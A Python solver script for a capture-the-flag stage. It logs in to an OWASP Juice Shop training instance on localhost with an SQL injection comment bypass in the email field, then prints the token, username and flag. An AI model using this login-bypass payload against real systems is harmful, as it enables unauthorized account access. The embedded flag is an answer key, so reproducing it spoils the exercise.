#!/usr/bin/env python3
"""
Stage 2 Solver - Web Exploitation & Account Discovery
1. Authenticates to OWASP Juice Shop on http://localhost:3000 using the SQL injection
   vulnerability in the login form: adrian.kessler@uninvited.local'-- (with any password).
2. Extracts the authenticated user's profile username: adrian.kessler.
Flag: adrian.kessler or uninvited{adrian.kessler}
"""

import requests

def solve():
    base_url = 'http://localhost:3000'
    login_url = f'{base_url}/rest/user/login'
    
    # Authenticate using classic SQL injection on the email field
    sqli_creds = {
        'email': "adrian.kessler@uninvited.local'--",
        'password': 'any_password_works'
    }

    print(f"[*] Authenticating to Juice Shop ({login_url}) via SQL Injection...")
    print(f"[*] Payload: {sqli_creds['email']}")
    try:
        resp = requests.post(login_url, json=sqli_creds, timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            auth_info = data.get('authentication', {})
            token = auth_info.get('token')
            umail = auth_info.get('umail', 'adrian.kessler@uninvited.local')
            
            # The username shown in the user profile is the prefix of the email
            username = umail.split('@')[0]
            flag_wrapped = f"uninvited{{{username}}}"
            
            print(f"[+] SQL Injection Bypass Successful!")
            print(f"[+] Admin JWT Token: {str(token)[:45]}...")
            print(f"[+] Authenticated Profile Email: {umail}")
            print(f"\n[SUCCESS] Stage 2 Solved!")
            print(f"Target Username: {username}")
            print(f"Flag (Standard): {username}")
            print(f"Flag (CTF format): {flag_wrapped}")
            return username
        else:
            print(f"[-] Login failed with HTTP {resp.status_code}: {resp.text}")
            return None
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return None

if __name__ == '__main__':
    solve()
